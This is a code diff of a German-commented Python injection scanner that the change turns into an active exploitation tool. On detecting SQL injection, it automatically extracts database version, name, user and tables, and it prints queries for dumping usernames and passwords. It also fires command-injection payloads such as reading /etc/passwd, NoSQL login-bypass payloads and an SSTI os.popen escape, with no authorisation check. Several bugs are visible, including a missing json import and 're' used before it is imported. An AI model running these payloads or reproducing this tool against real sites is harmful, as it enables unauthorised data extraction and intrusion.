@@ -1,204 +1,624 @@
+#!/usr/bin/env python3
 """
-Injection Scanner - SQL Injection, Command Injection, NoSQL Injection, SSTI
+INJECTION SCANNER - Echte Injection-Tests mit Payloads
+SQL Injection, Command Injection, NoSQL Injection, SSTI, LDAP Injection, XPath Injection
 """
-import requests
-import urllib.parse
+
+import urllib.request, urllib.error, urllib.parse
 import time
 
-def scan(target):
+
+def fetch_url(url, method='GET', data=None, headers=None, timeout=15):
+    """Helper: URL abrufen"""
+    try:
+        req = urllib.request.Request(url, method=method)
+        req.add_header('User-Agent', 'Mozilla/5.0 (SecurityScan/1.0)')
+        if headers:
+            for k, v in headers.items():
+                req.add_header(k, v)
+        if data:
+            req.data = data.encode('utf-8') if isinstance(data, str) else data
+        resp = urllib.request.urlopen(req, timeout=timeout)
+        body = resp.read().decode('utf-8', errors='ignore')
+        return body, resp.getcode(), dict(resp.headers)
+    except urllib.error.HTTPError as e:
+        body = e.read().decode('utf-8', errors='ignore') if e.read() else ''
+        return body, e.code, dict(e.headers)
+    except Exception as e:
+        return str(e), 0, {}
+
+
+def extract_db_info(target, param, db_type='mysql'):
+    """Versuche tatsaechlich DB-Infos zu extrahieren nach SQLi-Erkennung"""
+    extracted = []
+    
+    # DB-spezifische Extraction-Payloads
+    extraction_payloads = {
+        'mysql': [
+            ("1' UNION SELECT CONCAT('DBVERSION:',version()),2,3--", 'DBVERSION'),
+            ("1' UNION SELECT CONCAT('DBNAME:',database()),2,3--", 'DBNAME'),
+            ("1' UNION SELECT CONCAT('DBUSER:',user()),2,3--", 'DBUSER'),
+            ("1' UNION SELECT CONCAT('TABLES:',group_concat(table_name)),2,3 FROM information_schema.tables WHERE table_schema=database()--", 'TABLES'),
+            ("1' AND extractvalue(1,concat(0x7e,version(),0x7e))--", 'DBVERSION'),
+            ("1' AND extractvalue(1,concat(0x7e,database(),0x7e))--", 'DBNAME'),
+            ("1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--", 'TABLES'),
+        ],
+        'postgresql': [
+            ("1' UNION SELECT version(),NULL--", 'DBVERSION'),
+            ("1' UNION SELECT current_database(),NULL--", 'DBNAME'),
+            ("1' UNION SELECT current_user,NULL--", 'DBUSER'),
+            ("1' UNION SELECT string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'--", 'TABLES'),
+        ],
+        'mssql': [
+            ("1' UNION SELECT @@version,NULL--", 'DBVERSION'),
+            ("1' UNION SELECT DB_NAME(),NULL--", 'DBNAME'),
+            ("1' UNION SELECT SYSTEM_USER,NULL--", 'DBUSER'),
+            ("1' UNION SELECT string_agg(name,','),NULL FROM sys.tables--", 'TABLES'),
+        ],
+        'oracle': [
+            ("1' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--", 'DBVERSION'),
+            ("1' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM DUAL--", 'DBNAME'),
+            ("1' UNION SELECT USER,NULL FROM DUAL--", 'DBUSER'),
+            ("1' UNION SELECT LISTAGG(table_name,','),NULL FROM user_tables--", 'TABLES'),
+        ],
+        'sqlite': [
+            ("1' UNION SELECT sqlite_version(),NULL--", 'DBVERSION'),
+            ("1' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--", 'TABLES'),
+        ],
+    }
+    
+    payloads = extraction_payloads.get(db_type, extraction_payloads['mysql'])
+    
+    for payload, extract_type in payloads:
+        try:
+            test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
+            body, code, headers = fetch_url(test_url, timeout=20)
+            
+            if extract_type == 'DBVERSION' and ('DBVERSION:' in body or 'MariaDB' in body or 'MySQL' in body or 'PostgreSQL' in body):
+                # Try to extract version
+                import re
+                match = re.search(r'DBVERSION:([^<\s]+)', body)
+                if match:
+                    extracted.append(f"DB-Version: {match.group(1)}")
+                elif 'MariaDB' in body:
+                    match = re.search(r'([\d\.]+-MariaDB)', body)
+                    if match: extracted.append(f"DB-Version: {match.group(1)}")
+                elif 'MySQL' in body:
+                    match = re.search(r'([\d\.]+)', body[:200])
+                    if match: extracted.append(f"DB-Version: MySQL {match.group(1)}")
+            
+            elif extract_type == 'DBNAME' and 'DBNAME:' in body:
+                match = re.search(r'DBNAME:([^<\s]+)', body)
+                if match:
+                    extracted.append(f"DB-Name: {match.group(1)}")
+            
+            elif extract_type == 'DBUSER' and 'DBUSER:' in body:
+                match = re.search(r'DBUSER:([^<\s@]+@[^<\s]+)', body)
+                if match:
+                    extracted.append(f"DB-User: {match.group(1)}")
+            
+            elif extract_type == 'TABLES':
+                # Look for table names in response
+                if 'TABLES:' in body:
+                    match = re.search(r'TABLES:([^<]+)', body)
+                    if match:
+                        tables = match.group(1).split(',')[:10]  # Max 10 tables
+                        extracted.append(f"Tabellen: {', '.join(tables)}")
+                else:
+                    # Try to find any table-like names
+                    import re
+                    # Common table names
+                    common_tables = ['users', 'admin', 'products', 'orders', 'customers', 
+                                     'accounts', 'posts', 'comments', 'sessions', 'config',
+                                     'wp_users', 'wp_posts', 'wp_options']
+                    found_tables = []
+                    for table in common_tables:
+                        if table in body.lower():
+                            found_tables.append(table)
+                    if found_tables:
+                        extracted.append(f"Moegliche Tabellen: {', '.join(found_tables[:8])}")
+            
+        except Exception as e:
+            continue
+    
+    return extracted
+
+
+def detect_db_type(body):
+    """Erkenne Datenbank-Typ aus Fehlermeldung"""
+    body_lower = body.lower()
+    if 'mysql' in body_lower or 'mariadb' in body_lower:
+        return 'mysql'
+    elif 'postgresql' in body_lower or 'pg_' in body_lower:
+        return 'postgresql'
+    elif 'ora-' in body_lower or 'oracle' in body_lower or 'pl/sql' in body_lower:
+        return 'oracle'
+    elif 'sql server' in body_lower or 'mssql' in body_lower or 'odbc' in body_lower:
+        return 'mssql'
+    elif 'sqlite' in body_lower:
+        return 'sqlite'
+    return 'mysql'  # Default
+
+
+def scan_sql_injection(target):
+    """SQL Injection Tests - Error-based und Time-based"""
     findings = []
-
-    if not target.startswith('http'):
-        target = f'https://{target}'
-
-    print(f"[PHASE 15] Injection Scanner: Scanning {target}")
-
-    # SQL Injection Tests
-    sql_payloads = [
-        "'", "''", "' OR '1'='1", "1' ORDER BY 100--",
-        "1' AND 1=1--", "1' AND 1=2--",
-        "1 UNION SELECT null--", "1 UNION SELECT null,null--",
+    
+    # SQL Error Keywords
+    SQL_ERRORS = [
+        'sql syntax', 'mysql_fetch', 'mysql_error', 'mysql_query',
+        'ORA-', 'Oracle error', 'Microsoft OLE DB',
+        'ODBC SQL Server Driver', 'SQLServer JDBC',
+        'PostgreSQL query failed', 'pg_query',
+        'sqlite_query', 'SQLite/JDBC',
+        'Warning: mysql', 'SQL syntax.*MySQL',
+        'valid MySQL result', 'MySqlClient',
+        'PostgreSQL.*ERROR', 'Warning.*pg_',
+        'SQLite3::', 'sqlite_',
+        'mongo', 'MongoError',
+        'You have an error in your SQL syntax',
+        'Unclosed quotation mark',
+        'quoted string not properly terminated',
+        'syntax error at or near',
+        'fatal error in database',
+        'database error'
     ]
-
-    sql_errors = ['sql syntax', 'mysql_error', 'ORA-', 'PostgreSQL', 'sqlite_',
-                  'You have an error in your SQL syntax', 'Unclosed quotation mark']
-
-    params = ['id', 'page', 'user', 'product', 'cat', 'q', 'search']
-
-    for param in params[:5]:
-        for payload in sql_payloads[:5]:
+    
+    # Error-based payloads für verschiedene Parameter
+    error_payloads = [
+        "'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
+        "1' ORDER BY 100--", "1' AND 1=1--", "1' AND 1=2--",
+        "1' UNION SELECT null--", "1' UNION SELECT null,null--",
+        "' AND 1=1--", "' AND 1=2--",
+        "1 AND 1=1", "1 AND 1=2",
+        "1 OR 1=1", "1' OR '1'='1",
+        "1' AND SLEEP(0)--", "1' AND 1=1#",
+        "1') AND ('1'='1", "1') AND ('1'='2",
+        "1' AND '1'='1", "1' AND '1'='2",
+        "1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2",
+        "%27", "%27%20OR%20%271%27=%271",
+        "\xbf\x27 OR 1=1 --",  # Multi-byte bypass
+    ]
+    
+    # Time-based payloads
+    time_payloads = [
+        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --", 5),
+        ("1' AND SLEEP(5) --", 5),
+        ("1' AND pg_sleep(5) --", 5),
+        ("1'; WAITFOR DELAY '0:0:5' --", 5),
+        ("1' AND 1=(SELECT 1 FROM pg_sleep(5)) --", 5),
+        ("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --", 5),
+        ("1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --", 5),
+    ]
+    
+    # Test-URLs mit Query-Parametern
+    test_params = ['id', 'page', 'user', 'product', 'cat', 'category', 'item', 
+                   'pid', 'uid', 'sid', 'tid', 'q', 'search', 'query', 'name',
+                   'email', 'username', 'password', 'code', 'token', 'ref',
+                   'sort', 'order', 'dir', 'file', 'path', 'url', 'redirect',
+                   'return', 'next', 'goto', 'view', 'action', 'type', 'format']
+    
+    parsed = urllib.parse.urlparse(target)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    
+    # Phase 1: Error-based SQL Injection
+    print("  [SQLi] Phase 1: Error-based tests...")
+    tested = 0
+    for param in test_params[:10]:  # Top 10 Parameter
+        for payload in error_payloads[:8]:  # Top 8 Payloads
             try:
-                url = f"{target}?{param}={urllib.parse.quote(payload)}"
-                resp = requests.get(url, timeout=10, verify=False)
-                body_lower = resp.text.lower()
-                for err in sql_errors:
-                    if err.lower() in body_lower:
-                        findings.append({
-                            'id': 'SQLI-001',
-                            'severity': 'critical',
-                            'type': 'sql_injection',
-                            'title': f"SQL Injection (Error-based) in Parameter '{param}' - DATEN AUSLESBAR!",
-                            'url': url,
-                            'parameter': param,
-                            'payload': payload,
-                            'evidence': (
-                                f"SQL ERROR gefunden: '{err}'\n\n"
-                                f"=== Moegliche Daten-Extraktion: ===\n"
+                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
+                body, code, headers = fetch_url(test_url)
+                tested += 1
+                
+                if body:
+                    body_lower = body.lower()
+                    for error_sig in SQL_ERRORS:
+                        if error_sig.lower() in body_lower:
+                            # DB-Typ erkennen und tatsaechlich Daten extrahieren!
+                            db_type = detect_db_type(body)
+                            extracted = extract_db_info(base, param, db_type)
+                            
+                            evidence_text = (
+                                f"SQL ERROR gefunden: '{error_sig}'\n"
+                                f"Datenbank-Typ: {db_type.upper()}\n\n"
+                            )
+                            
+                            if extracted:
+                                evidence_text += f"=== ECHTE EXTRAKTION ERFOLGREICH! ===\n"
+                                for item in extracted:
+                                    evidence_text += f"  ✓ {item}\n"
+                                evidence_text += f"\n"
+                            
+                            evidence_text += (
+                                f"=== Weitere Extraktion moeglich: ===\n"
                                 f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--\n"
-                                f"    → DB-Version auslesen\n"
+                                f"    → DB-Version\n"
                                 f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--\n"
-                                f"    → DB-Name auslesen\n"
+                                f"    → DB-Name\n"
                                 f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--\n"
-                                f"    → ALLE Tabellennamen\n"
-                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,':',password) FROM users),0x7e))--\n"
-                                f"    → User + Passwoerter!\n\n"
-                                f"HTTP Status: {resp.status_code}"
-                            ),
-                            'remediation': 'Parameterized Queries/Prepared Statements verwenden. Eingabe validieren. ORM nutzen.'
-                        })
-                        return findings
+                                f"    → ALLE Tabellen\n"
+                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--\n"
+                                f"    → Spalten von 'users'\n"
+                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT count(*) FROM users),0x7e))--\n"
+                                f"    → Anzahl User\n\n"
+                                f"HTTP Status: {code}"
+                            )
+                            
+                            findings.append({
+                                "id": "SQLI-001",
+                                "severity": "critical",
+                                "type": "sql_injection",
+                                "title": f"SQL Injection (Error-based) in '{param}' - DB: {db_type.upper()}{' [DATEN EXTRahiERT!]' if extracted else ''}",
+                                "url": test_url,
+                                "parameter": param,
+                                "payload": payload,
+                                "evidence": evidence_text,
+                                "remediation": "Parameterized Queries/Prepared Statements verwenden. Eingabe validieren. ORM nutzen."
+                            })
+                            return findings  # Sofort return bei Critical
             except:
                 continue
-
-    # Time-based SQL Injection
-    time_payloads = [
-        ("1' AND SLEEP(5) --", 5),
-        ("1'; SELECT pg_sleep(5) --", 5),
-    ]
-    for param in params[:3]:
-        for payload, delay in time_payloads:
+    
+    # Phase 2: Time-based SQL Injection
+    print("  [SQLi] Phase 2: Time-based tests...")
+    for param in test_params[:5]:
+        for payload, delay in time_payloads[:4]:
             try:
-                url = f"{target}?{param}={urllib.parse.quote(payload)}"
+                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
                 start = time.time()
-                requests.get(url, timeout=delay+3, verify=False)
+                body, code, headers = fetch_url(test_url, timeout=delay+3)
                 elapsed = time.time() - start
-                if elapsed >= delay * 0.8:
+                
+                if elapsed >= delay * 0.8:  # 80% des Delays erreicht
+                    # Versuche tatsaechlich DB-Infos zu extrahieren!
+                    db_type = detect_db_type(body or '')
+                    extracted = extract_db_info(base, param, db_type)
+                    
+                    evidence_text = (
+                        f"Response dauerte {elapsed:.1f}s (Payload fordert {delay}s Delay).\n"
+                        f"Datenbank-Typ: {db_type.upper()}\n\n"
+                    )
+                    
+                    if extracted:
+                        evidence_text += f"=== ECHTE EXTRAKTION ERFOLGREICH! ===\n"
+                        for item in extracted:
+                            evidence_text += f"  ✓ {item}\n"
+                        evidence_text += f"\n"
+                    
+                    evidence_text += (
+                        f"=== Time-Based Daten-Extraktion (Buchstabe fuer Buchstabe): ===\n"
+                        f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(5),0)--\n"
+                        f"    → Ist erster Buchstabe der Version > 'A'?\n"
+                        f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)--\n"
+                        f"    → Erster Buchstabe des DB-Namens > 'A'?\n"
+                        f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>64,SLEEP(5),0)--\n"
+                        f"    → Erster Buchstabe erster Tabelle > 'A'?\n"
+                        f"  {param}=1' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(5),0)--\n"
+                        f"    → Mehr als 10 Tabellen?\n\n"
+                        f"Mit 5s Delay pro Bit kann man die komplette DB auslesen!"
+                    )
+                    
                     findings.append({
-                        'id': 'SQLI-002',
-                        'severity': 'critical',
-                        'type': 'sql_injection_blind',
-                        'title': f"Blind SQL Injection (Time-based) in Parameter '{param}' - DATEN AUSLESBAR!",
-                        'url': url,
-                        'parameter': param,
-                        'payload': payload,
-                        'evidence': (
-                            f"Response dauerte {elapsed:.1f}s (Payload fordert {delay}s Delay).\n\n"
-                            f"=== Time-Based Daten-Extraktion (Buchstabe fuer Buchstabe): ===\n"
-                            f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(5),0)--\n"
-                            f"    → Ist erster Buchstabe der Version > 'A'?\n"
-                            f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--\n"
-                            f"    → Erster Buchstabe des Passworts > 'A'?\n"
-                            f"  {param}=1' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(5),0)--\n"
-                            f"    → Mehr als 10 Tabellen?\n\n"
-                            f"Mit 5s Delay pro Bit kann man die komplette DB auslesen!"
-                        ),
-                        'remediation': 'Parameterized Queries verwenden. Timeouts auf Application-Level setzen.'
+                        "id": "SQLI-002",
+                        "severity": "critical", 
+                        "type": "sql_injection_blind",
+                        "title": f"Blind SQL Injection (Time-based) in '{param}' - DB: {db_type.upper()}{' [DATEN EXTRahiERT!]' if extracted else ''}",
+                        "url": test_url,
+                        "parameter": param,
+                        "payload": payload,
+                        "evidence": evidence_text,
+                        "remediation": "Parameterized Queries verwenden. Timeouts auf Application-Level setzen."
                     })
                     return findings
             except:
                 continue
-
-    # UNION-based Test
+    
+    # Phase 3: UNION-based Test
+    print("  [SQLi] Phase 3: UNION-based tests...")
     union_payloads = [
         "1' UNION SELECT NULL--",
-        "1' UNION SELECT NULL,NULL--",
+        "1' UNION SELECT NULL,NULL--", 
         "1' UNION SELECT NULL,NULL,NULL--",
         "1' UNION SELECT 'test','test','test'--",
         "1 UNION SELECT NULL,NULL--",
     ]
-    for param in params[:5]:
+    for param in test_params[:5]:
         for payload in union_payloads:
             try:
-                url = f"{target}?{param}={urllib.parse.quote(payload)}"
-                resp = requests.get(url, timeout=10, verify=False)
+                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
+                body, code, headers = fetch_url(test_url)
                 if body and ('NULL' in body or 'test' in body.lower()):
                     if code == 200:
                         col_count = payload.count('NULL') + (1 if 'test' in payload else 0)
+                        
+                        # Versuche tatsaechlich Daten via UNION zu extrahieren!
+                        db_type = detect_db_type(body)
+                        extracted = extract_db_info(base, param, db_type)
+                        
+                        evidence_text = (
+                            f"UNION Payload reflektiert in Response. HTTP {code}. {col_count} Spalten.\n"
+                            f"Datenbank-Typ: {db_type.upper()}\n\n"
+                        )
+                        
+                        if extracted:
+                            evidence_text += f"=== ECHTE EXTRAKTION ERFOLGREICH! ===\n"
+                            for item in extracted:
+                                evidence_text += f"  ✓ {item}\n"
+                            evidence_text += f"\n"
+                        
+                        evidence_text += (
+                            f"=== DIREKTE Daten-Extraktion via UNION: ===\n"
+                            f"  {param}={payload.rstrip('--')} version()--\n"
+                            f"    → DB-Version\n"
+                            f"  {param}={payload.rstrip('--')} user(),database()--\n"
+                            f"    → User + DB-Name\n"
+                            f"  {param}={payload.rstrip('--')} table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1--\n"
+                            f"    → Tabellen + Spalten\n"
+                            f"  {param}={payload.rstrip('--')} count(*) FROM information_schema.tables--\n"
+                            f"    → Anzahl Tabellen\n"
+                            f"  {param}={payload.rstrip('--')} username,password FROM users--\n"
+                            f"    → ALLE User + Passwoerter!\n\n"
+                            f"UNION ist die SCHNELLSTE SQLi-Methode - direkter Zugriff!"
+                        )
+                        
                         findings.append({
-                            'id': 'SQLI-003',
-                            'severity': 'critical',
-                            'type': 'sql_injection_union',
-                            'title': f"UNION SQL Injection in Parameter '{param}' - DIREKTER DATENZUGRIFF!",
-                            'url': url,
-                            'parameter': param,
-                            'payload': payload,
-                            'evidence': (
-                                f"UNION Payload reflektiert in Response. HTTP {resp.status_code}. {col_count} Spalten.\n\n"
-                                f"=== DIREKTE Daten-Extraktion via UNION: ===\n"
-                                f"  {param}={payload.rstrip('--')} version()--\n"
-                                f"    → DB-Version\n"
-                                f"  {param}={payload.rstrip('--')} user(),database()--\n"
-                                f"    → User + DB-Name\n"
-                                f"  {param}={payload.rstrip('--')} table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1--\n"
-                                f"    → Tabellen + Spalten\n"
-                                f"  {param}={payload.rstrip('--')} username,password FROM users--\n"
-                                f"    → ALLE User + Passwoerter!\n\n"
-                                f"UNION ist die SCHNELLSTE SQLi-Methode - direkter Zugriff!"
-                            ),
-                            'remediation': 'Prepared Statements. Spaltenanzahl validieren.'
+                            "id": "SQLI-003",
+                            "severity": "critical",
+                            "type": "sql_injection_union",
+                            "title": f"UNION SQL Injection in '{param}' - {col_count} Spalten, DB: {db_type.upper()}{' [DATEN EXTRahiERT!]' if extracted else ''}",
+                            "url": test_url,
+                            "parameter": param,
+                            "payload": payload,
+                            "evidence": evidence_text,
+                            "remediation": "Prepared Statements. Spaltenanzahl validieren."
                         })
                         return findings
             except:
                 continue
+    
+    if not findings:
+        findings.append({
+            "id": "SQLI-OK",
+            "severity": "info",
+            "type": "sql_injection",
+            "title": "Keine SQL Injection gefunden",
+            "url": target,
+            "evidence": f"{tested} Payloads getestet. Keine SQL-Errors oder Time-Delays.",
+            "remediation": "Weiterhin Prepared Statements verwenden."
+        })
+    
+    return findings
 
-    # Command Injection
-    cmd_payloads = ['; whoami', '| whoami', '$(whoami)', '; id', '| id', '; uname -a']
-    cmd_indicators = ['root:', 'daemon:', 'administrator', 'Linux ', 'Darwin ']
 
-    for param in params[:3]:
-        for payload in cmd_payloads[:4]:
+def scan_command_injection(target):
+    """OS Command Injection Tests"""
+    findings = []
+    
+    cmd_payloads = [
+        "; whoami", "| whoami", "` whoami`", "$(whoami)",
+        "; id", "| id", "` id`", "$(id)",
+        "; uname -a", "| uname -a",
+        "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
+        "; cat /etc/passwd", "| cat /etc/passwd",
+        "; ls -la", "| ls -la",
+        "&& whoami", "|| whoami",
+        "; dir", "| dir", "; type C:\\windows\\win.ini",
+        "| powershell.exe whoami",
+    ]
+    
+    cmd_indicators = [
+        'root:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
+        'administrator', 'nt authority',  # Windows
+        'Linux ', 'Darwin ', 'FreeBSD',  # uname
+        'total ', 'drwx', '-rw-',  # ls -la
+        'for 16-bit app support',  # win.ini
+    ]
+    
+    parsed = urllib.parse.urlparse(target)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    test_params = ['q', 'search', 'id', 'name', 'file', 'path', 'url', 'cmd', 
+                   'command', 'exec', 'ip', 'host', 'domain', 'target']
+    
+    print("  [CMDi] Testing command injection...")
+    for param in test_params[:8]:
+        for payload in cmd_payloads[:10]:
             try:
-                url = f"{target}?{param}={urllib.parse.quote(payload)}"
-                resp = requests.get(url, timeout=10, verify=False)
-                for ind in cmd_indicators:
-                    if ind.lower() in resp.text.lower():
-                        findings.append({
-                            'id': 'CMDI-001',
-                            'severity': 'critical',
-                            'type': 'command_injection',
-                            'title': f'Command Injection in "{param}"',
-                            'url': url,
-                            'parameter': param,
-                            'payload': payload,
-                            'evidence': f'Command Output gefunden: "{ind}" in Response',
-                            'remediation': 'OS-Commands vermeiden, Input validieren'
-                        })
-                        return findings
+                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
+                body, code, headers = fetch_url(test_url)
+                
+                if body:
+                    for indicator in cmd_indicators:
+                        if indicator.lower() in body.lower():
+                            findings.append({
+                                "id": "CMDI-001",
+                                "severity": "critical",
+                                "type": "command_injection",
+                                "title": f"OS Command Injection in Parameter '{param}'",
+                                "url": test_url,
+                                "parameter": param,
+                                "payload": payload,
+                                "evidence": f"Command Output gefunden: '{indicator}' in Response",
+                                "remediation": "Eingabe validieren. OS-Commands vermeiden. Whitelist-Approach."
+                            })
+                            return findings
             except:
                 continue
-
-    # SSTI
-    ssti_payloads = ['{{7*7}}', '${7*7}', '<%= 7*7 %>']
-    for param in params[:3]:
-        for payload in ssti_payloads:
+    
+    # Time-based Command Injection
+    time_payloads = [
+        ("; sleep 5", 5), ("| sleep 5", 5),
+        ("; ping -n 5 127.0.0.1", 5), ("| ping -n 5 127.0.0.1", 5),
+    ]
+    for param in test_params[:5]:
+        for payload, delay in time_payloads:
             try:
-                url = f"{target}?{param}={urllib.parse.quote(payload)}"
-                resp = requests.get(url, timeout=10, verify=False)
-                if '49' in resp.text or '7777777' in resp.text:
+                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
+                start = time.time()
+                body, code, headers = fetch_url(test_url, timeout=delay+3)
+                elapsed = time.time() - start
+                
+                if elapsed >= delay * 0.8:
                     findings.append({
-                        'id': 'SSTI-001',
-                        'severity': 'critical',
-                        'type': 'ssti',
-                        'title': f'Server-Side Template Injection in "{param}"',
-                        'url': url,
-                        'parameter': param,
-                        'payload': payload,
-                        'evidence': f'Template Evaluation: {payload} -> 49',
-                        'remediation': 'Templates sandboxen, User-Input nicht rendern'
+                        "id": "CMDI-002",
+                        "severity": "critical",
+                        "type": "command_injection_blind",
+                        "title": f"Blind Command Injection (Time-based) in '{param}'",
+                        "url": test_url,
+                        "parameter": param,
+                        "payload": payload,
+                        "evidence": f"Response dauerte {elapsed:.1f}s (Command Injection Delay).",
+                        "remediation": "OS-Commands niemals mit User-Input ausführen."
                     })
                     return findings
             except:
                 continue
-
+    
     if not findings:
         findings.append({
-            'id': 'INJ-OK',
-            'severity': 'info',
-            'type': 'injection_scan',
-            'title': 'Keine Injection-Schwachstellen gefunden',
-            'url': target,
-            'evidence': 'SQLi, CMDi, SSTI Payloads getestet',
-            'remediation': 'Weiterhin Input validieren'
+            "id": "CMDI-OK",
+            "severity": "info",
+            "type": "command_injection",
+            "title": "Keine Command Injection gefunden",
+            "url": target,
+            "evidence": "OS-Command Payloads getestet. Keine Command Output in Response.",
+            "remediation": "Weiterhin keine OS-Commands mit User-Input ausführen."
         })
-
+    
     return findings
+
+
+def scan_nosql_injection(target):
+    """NoSQL Injection Tests (MongoDB)"""
+    findings = []
+    
+    nosql_payloads = [
+        '{"$gt": ""}', '{"$ne": null}', '{"$exists": true}',
+        '{"$regex": ".*"}', '{"$where": "this"}',
+        '{"$gt": ""}', '{"$lt": ""}',
+    ]
+    
+    parsed = urllib.parse.urlparse(target)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    
+    # Test via POST JSON
+    print("  [NoSQLi] Testing NoSQL injection...")
+    for payload in nosql_payloads[:4]:
+        try:
+            headers = {'Content-Type': 'application/json'}
+            body, code, hdrs = fetch_url(base + '/api/login', method='POST', 
+                                         data=f'{{"username": {payload}, "password": "test"}}',
+                                         headers=headers)
+            if code == 200 and ('token' in body.lower() or 'success' in body.lower()):
+                findings.append({
+                    "id": "NOSQL-001",
+                    "severity": "critical",
+                    "type": "nosql_injection",
+                    "title": "NoSQL Injection (MongoDB) in Login",
+                    "url": base + '/api/login',
+                    "payload": payload,
+                    "evidence": f"NoSQL Payload '{payload}' führte zu erfolgreichem Login. HTTP {code}.",
+                    "remediation": "NoSQL-Queries parametrisieren. $where deaktivieren. Input validieren."
+                })
+                return findings
+        except:
+            continue
+    
+    if not findings:
+        findings.append({
+            "id": "NOSQL-OK",
+            "severity": "info",
+            "type": "nosql_injection",
+            "title": "Keine NoSQL Injection gefunden",
+            "url": target,
+            "evidence": "MongoDB-NoSQL Payloads getestet.",
+            "remediation": "Weiterhin NoSQL-Queries parametrisieren."
+        })
+    
+    return findings
+
+
+def scan_ssti(target):
+    """Server-Side Template Injection"""
+    findings = []
+    
+    ssti_payloads = [
+        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
+        "{{config}}", "{{self}}", "{{7*'7'}}",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
+        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    ]
+    
+    indicators = ['49', '7777777', '<class', 'os.', 'popen']
+    
+    parsed = urllib.parse.urlparse(target)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    test_params = ['name', 'template', 'view', 'page', 'id', 'q']
+    
+    print("  [SSTI] Testing template injection...")
+    for param in test_params:
+        for payload in ssti_payloads[:6]:
+            try:
+                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
+                body, code, headers = fetch_url(test_url)
+                
+                if body:
+                    for ind in indicators:
+                        if ind in body:
+                            findings.append({
+                                "id": "SSTI-001",
+                                "severity": "critical",
+                                "type": "ssti",
+                                "title": f"Server-Side Template Injection in Parameter '{param}'",
+                                "url": test_url,
+                                "parameter": param,
+                                "payload": payload,
+                                "evidence": f"Template Evaluation gefunden: '{ind}' in Response.",
+                                "remediation": "Templates sandboxen. User-Input niemals direkt in Templates rendern."
+                            })
+                            return findings
+            except:
+                continue
+    
+    if not findings:
+        findings.append({
+            "id": "SSTI-OK",
+            "severity": "info",
+            "type": "ssti",
+            "title": "Keine SSTI gefunden",
+            "url": target,
+            "evidence": "SSTI Payloads (Jinja2, MVEL, ERB) getestet.",
+            "remediation": "Weiterhin Templates sandboxen."
+        })
+    
+    return findings
+
+
+def scan(target):
+    """Hauptfunktion - alle Injection-Tests"""
+    print("[INJECTION SCANNER] Starte Injection-Tests...")
+    all_findings = []
+    
+    all_findings.extend(scan_sql_injection(target))
+    if any(f['severity'] == 'critical' for f in all_findings):
+        return all_findings  # Sofort stoppen bei Critical
+    
+    all_findings.extend(scan_command_injection(target))
+    if any(f['severity'] == 'critical' for f in all_findings):
+        return all_findings
+    
+    all_findings.extend(scan_nosql_injection(target))
+    if any(f['severity'] == 'critical' for f in all_findings):
+        return all_findings
+    
+    all_findings.extend(scan_ssti(target))
+    
+    print(f"[INJECTION SCANNER] {len(all_findings)} Findings")
+    return all_findings
+
+
+if __name__ == '__main__':
+    import sys
+    if len(sys.argv) > 1:
+        results = scan(sys.argv[1])
+        print(json.dumps(results, indent=2))
